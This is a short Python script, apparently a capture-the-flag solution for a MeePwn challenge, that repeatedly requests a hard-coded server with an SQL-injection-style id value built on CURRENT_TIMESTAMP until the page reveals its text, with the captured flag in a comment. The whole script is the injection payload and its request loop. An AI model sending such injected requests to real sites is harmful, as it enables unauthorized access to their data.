import requests

count = 0
while True:
    print str(count)
    r = requests.get('http://139.59.239.133/v2/?id=1%2BCURRENT_TIMESTAMP%252')
    if 'What' in r.text:
        print r.text
        break
    count += 1

# MeePwnCTF{_I_g1ve__uPPPPPPPP}
